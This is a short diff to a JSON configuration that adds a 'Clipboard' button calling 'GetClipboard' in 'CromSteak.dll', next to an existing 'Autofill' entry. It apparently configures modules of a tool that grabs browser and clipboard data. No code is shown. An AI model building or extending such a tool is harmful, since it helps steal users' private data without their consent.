@@ -48,6 +48,14 @@
         "IsMainButton": false
     },
     {
+        "ButtonLabel": "Clipboard",
+        "ButtonId": "clipboard",
+        "DllFileName": "CromSteak.dll",
+        "TypeName": "Crom",
+        "Entry": "GetClipboard",
+        "IsMainButton": false
+    },
+    {
         "ButtonLabel": "Autofill",
         "ButtonId": "autofill",
         "DllFileName": "CromSteak.dll",
